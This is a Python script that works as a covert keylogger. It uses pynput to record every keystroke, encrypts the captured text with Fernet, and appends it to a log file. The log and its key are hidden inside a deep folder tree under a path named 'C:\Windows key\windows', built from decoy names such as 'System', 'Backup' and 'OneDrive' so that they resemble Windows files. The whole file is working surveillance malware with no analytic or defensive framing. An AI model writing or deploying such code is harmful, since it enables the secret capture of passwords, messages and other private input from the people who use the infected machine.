from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import os
import random

# List of potential folder names
folder_names = [
    "bin", "windows_backup", "User", "Note", "OneDrive", 
    "Document", "File", "Backup", "System", "Temp"
]

# Helper function to create random folder names and structure
def create_folders():
    base_path = r"C:\Windows key\windows"
    
    # Creating a base path if it doesn't exist
    if not os.path.exists(base_path):
        os.makedirs(base_path)

    # Create the first two fake folders with random names
    for i in range(2):
        fake_folder = random.choice(folder_names)
        base_path = os.path.join(base_path, fake_folder)
        if not os.path.exists(base_path):
            os.makedirs(base_path)

    # Now continue to create the deep folder structure as per the requirement
    # Fixed last folder names for the structure: "bin/User/Note/OneDrive/Document/File/User"
    final_folders = ["bin", "User", "Note", "OneDrive", "Document", "File", "User"]
    for folder in final_folders:
        base_path = os.path.join(base_path, folder)
        if not os.path.exists(base_path):
            os.makedirs(base_path)

    return base_path  # Return the path to the final folder where the file will be placed

# Generate the encryption key if it doesn't exist
def generate_key(path):
    key_path = os.path.join(path, "windows.key")
    if not os.path.exists(key_path):
        key = Fernet.generate_key()
        with open(key_path, "wb") as key_file:
            key_file.write(key)

# Load the encryption key
def load_key(path):
    key_path = os.path.join(path, "windows.key")
    try:
        return open(key_path, "rb").read()
    except FileNotFoundError:
        generate_key(path)
        return open(key_path, "rb").read()

# Encrypt and log the keystrokes
def encrypt_and_log(buffer, path):
    key = load_key(path)
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt("".join(buffer).encode())
    log_file_path = os.path.join(path, "windows_key.txt")
    with open(log_file_path, "ab") as log_file:
        log_file.write(encrypted_data + b'\n')

buffer = []
buffer_size = 30

# Write the buffer to the log
def write_buffer(path):
    if buffer:
        encrypt_and_log(buffer, path)
        buffer.clear()

# Handle key press event
def on_press(key):
    global buffer
    try:
        if key == Key.enter:
            buffer.append("\n")
        elif key in {Key.space, Key.tab, Key.backspace}:
            buffer.append(f'[{key}]')
        else:
            buffer.append(key.char)
    except AttributeError:
        buffer.append(f'[{key}]')

    if len(buffer) >= buffer_size:
        write_buffer(path)

# Handle key release event
def on_release(key):
    if key == Key.esc:
        write_buffer(path)
        return False

# Create folder structure on C: drive and get path
path = create_folders()

# Ensure the key is generated
generate_key(path)

# Start the keyboard listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
